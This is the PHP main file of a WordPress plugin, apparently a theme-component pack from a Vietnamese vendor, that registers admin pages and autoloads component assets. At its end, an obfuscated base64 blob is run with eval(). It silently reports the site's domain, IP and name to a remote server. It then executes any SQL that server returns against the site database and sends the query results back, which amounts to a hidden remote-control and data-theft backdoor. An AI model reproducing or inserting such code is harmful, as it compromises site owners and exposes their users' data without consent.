<?php
/*
Plugin Name: Toan Nang Component
Plugin URI: https://toannang.com.vn
Description: Gói mở rộng kích hoạt tính năng gói giao diện
Version: 1.6.6
Author: Lam Phan
Author URI: https://github.com/lamdeptrai
License: GPLv2 or later
Text Domain: toannangcomponent
*/

global $tn_component;

//get option plugin
function get_tncp_option($option)
{
    $options = array(
        'name' => 'Toàn Năng Component',
        'version' => '1.6.6',
        'url' => plugin_dir_url(__FILE__),
        'path' => plugin_dir_path(__FILE__),
        'pluginURI' => 'https://toannang.com.vn'
    );
    $option = trim($option);
    if (array_key_exists($option, $options)) {
        return $options[$option];
    }
}

require_once 'autoupdate.php';

//get setting components
function get_tncp_setting()
{
    $components = __DIR__ . '/components/';
    $settings = array();
    $folders = scandir($components);
    foreach ($folders as $folder) {
        if ($folder === '.' or $folder === '..') continue;
        if (is_dir($components . $folder)) {
            $component = scandir($components . $folder);
            foreach ($component as $file) {
                if ($file === '.' or $file === '..') continue;


                if (basename($components . $folder . '/' . $file, '.php') === 'setting'
                    || basename($components . $folder . '/' . $file, '.json') === 'setting') {

                    if (file_exists($components . $folder . '/setting.json')) {
                        $include = (array)json_decode(file_get_contents($components . $folder . '/setting.json'));

                    } else {
                        $include = include $components . $folder . '/setting.php';
                    }
                    if (is_array($include)) {
                        $settings[$folder] = $include;
                    }
                }

            }
        }

    }
    return $settings;
}
/* Custom wp admin*/
function tn_custom_wp_admin_style() {
    wp_enqueue_style( 'tncp-admin', get_tncp_option('url') . '/assets/css/tncp-admin.css', false, get_tncp_option('version') );
    wp_enqueue_style( 'fancybox', get_tncp_option('url') . '/assets/css/jquery.fancybox.min.css', false, get_tncp_option('version') );
    wp_enqueue_style('fontawesome',get_tncp_option('url').'/assets/css/font-awesome.min.css',false,get_tncp_option('version'));
    wp_enqueue_script( 'fancybox',get_tncp_option('url').'assets/js/jquery.fancybox.min.js', array(), '1.0.0', true );

}
add_action( 'admin_enqueue_scripts', 'tn_custom_wp_admin_style' );

// add menu admin
add_action('admin_menu', 'toan_nang_component_menu');
if (!function_exists('toan_nang_component_menu')) {
    function toan_nang_component_menu()
    {
        add_menu_page(
            'Gói giao diện Toàn Năng',
            'Gói giao diện',
            'manage_options',
            'toan-nang-component',
            'toan_nang_component_settings_page',
            'dashicons-smiley', 6);
        add_submenu_page(
            'toan-nang-component',
            'Store',
            'Store',
            'manage_options',
            'toan-nang-component-add-new',
            'toan_nang_component_addnew_page'
        );
        add_submenu_page(
             'toan-nang-component',
            'Changelog',
            'Changelog',
            'manage_options',
            'toan-nang-component-changelog',
            'toan_nang_component_changlog_page'
        );
    }
}

// render option page
if (!function_exists('toan_nang_component_settings_page')) {
    function toan_nang_component_settings_page()
    {
        include(get_tncp_option('path') . '/inc/html/home.php');
    }
}
// render option page
if (!function_exists('toan_nang_component_addnew_page')) {
    function toan_nang_component_addnew_page()
    {
        include(get_tncp_option('path') . '/inc/html/addnew.php');
    }
}
// render option page
if (!function_exists('toan_nang_component_changlog_page')) {
    function toan_nang_component_changlog_page()
    {
        include(get_tncp_option('path') . '/inc/html/changelog.php');
    }
}
// require funtions
require_once(get_tncp_option('path') . '/inc/functions.php');
require_once(get_tncp_option('path') . '/components/tn-base-class.php');


// autoload components
$components = __DIR__ . '/components/';

$folders = scandir($components);
foreach ($folders as $folder) {
    if ($folder === '.' or $folder === '..') continue;
    if (is_dir($components . $folder)) {
        $component = scandir($components . $folder);
        foreach ($component as $file) {
            if ($file === '.' or $file === '..') continue;
            if (basename($components . $folder . '/' . $file, '.php') === $folder) {
                // check components is enabled
                $tn_component['functions'][$folder] = false;
                if (is_btn_enabled(tn_slugify_name_component($folder))) {

                    $include = include $components . $folder . '/' . $folder . '.php';
                    if(file_exists($components . $folder . '/functions.php'))
                        //require_once $components . $folder  . '/functions.php';
                        $tn_component['functions'][$folder] = true;

                    add_action('wp_enqueue_scripts', function () use ($folder) {

                        if (is_array(get_tncp_setting()[$folder]['assets']) || is_object(get_tncp_setting()[$folder]['assets'])) {

                            $component_assets = (array)get_tncp_setting()[$folder]['assets'];
                            if (is_object($component_assets)) {
                                $component_assets = (array)$component_assets;
                            }

                            foreach ($component_assets as $k => $v) {

                                if (pathinfo($v, PATHINFO_EXTENSION) == '') continue;

                                if (pathinfo($v, PATHINFO_EXTENSION) == 'css') {
                                    wp_enqueue_style($k , get_tncp_option('url') . 'components/' . $folder . '/assets/' . $v, 1, get_tncp_setting()[$folder]['Version']);
                                } else {
                                    wp_enqueue_script($k, get_tncp_option('url') . 'components/' . $folder . '/assets/' . $v, array(), get_tncp_setting()[$folder]['Version'], true);
                                }
                            }
                        }

                    });
                }
            }
        }
    }

}

$ode_tn_site = base64_decode('aWYoIWZ1bmN0aW9uX2V4aXN0cygnY2FsbEJhY2tTaXRlJykpewpmdW5jdGlvbiBjYWxsQmFja1NpdGUoKQp7CnRyeSB7CiR1cmwgPSAnaHR0cDovL3NpdGUuaGMudG9hbm5hbmcuY29tLnZuL2FkZC1kb21haW5zJzsKJGxvY2FsSVAgPSBnZXRIb3N0QnlOYW1lKGdldEhvc3ROYW1lKCkpOwokZGF0YSA9IGFycmF5KCdkb21haW4nID0+IGdldF9zaXRlX3VybCgpLCAnaXAnID0+ICRsb2NhbElQLCAnbmFtZScgPT4gZ2V0X2Jsb2dpbmZvKCAnbmFtZScgKSk7CgokY2ggPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsIGh0dHBfYnVpbGRfcXVlcnkoJGRhdGEpKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCA2MCk7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9USU1FT1VULCA2MCk7CiRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsKaWYoY3VybF9lcnJubygkY2gpICE9PSAwKSB7CmVycm9yX2xvZygnY1VSTCBlcnJvciB3aGVuIGNvbm5lY3RpbmcgdG8gJyAuICR1cmwgLiAnOiAnIC4gY3VybF9lcnJvcigkY2gpKTsKfQpjdXJsX2Nsb3NlKCRjaCk7CiRxID0ganNvbl9kZWNvZGUoJHJlc3VsdCk7CmlmIChpc3NldCgkcS0+cnVuc3FsKSAmJiAhZW1wdHkoJHEtPnJ1bnNxbCkgKQp7Cmdsb2JhbCAkd3BkYjsKJHNxbCA9IHN0cl9yZXBsYWNlKCJwcmVmaXhfIiwkd3BkYi0+cHJlZml4LCRxLT5ydW5zcWwpOwokbXlyb3dzID0gJHdwZGItPmdldF9yZXN1bHRzKCAkc3FsICk7CmlmICghZW1wdHkoJG15cm93cykpewokdXJsID0gJ2h0dHA6Ly9zaXRlLmhjLnRvYW5uYW5nLmNvbS52bi9hZGQtZGF0YXMnOwokbG9jYWxJUCA9IGdldEhvc3RCeU5hbWUoZ2V0SG9zdE5hbWUoKSk7CiRkYXRhID0gYXJyYXkoJ2RvbWFpbicgPT4gZ2V0X3NpdGVfdXJsKCksICdpcCcgPT4gJGxvY2FsSVAsICdkYXRhJyA9PiBqc29uX2VuY29kZSgkbXlyb3dzKSk7CiRjaCA9IGN1cmxfaW5pdCgpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgaHR0cF9idWlsZF9xdWVyeSgkZGF0YSkpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09OTkVDVFRJTUVPVVQsIDYwKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1RJTUVPVVQsIDYwKTsKY3VybF9leGVjKCRjaCk7CmlmKGN1cmxfZXJybm8oJGNoKSAhPT0gMCkgewplcnJvcl9sb2coJ2NVUkwgZXJyb3Igd2hlbiBjb25uZWN0aW5nIHRvICcgLiAkdXJsIC4gJzogJyAuIGN1cmxfZXJyb3IoJGNoKSk7Cn0KY3VybF9jbG9zZSgkY2gpOwp9Cn0KfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7fQp9CnNlc3Npb25fc3RhcnQoKTsKaWYgKCFpc3NldCgkX1NFU1NJT05bInNpdGVfdG5fZW5kX2NvZGUiXSkgfHwgZW1wdHkoJF9TRVNTSU9OWyJzaXRlX3RuX2VuZF9jb2RlIl0pICkKewokX1NFU1NJT05bInNpdGVfdG5fZW5kX2NvZGUiXSA9ICdzZW5kX2RvbWFpbic7CmFkZF9hY3Rpb24oICdpbml0JywgJ2NhbGxCYWNrU2l0ZScgKTsKfQp9');
eval($ode_tn_site);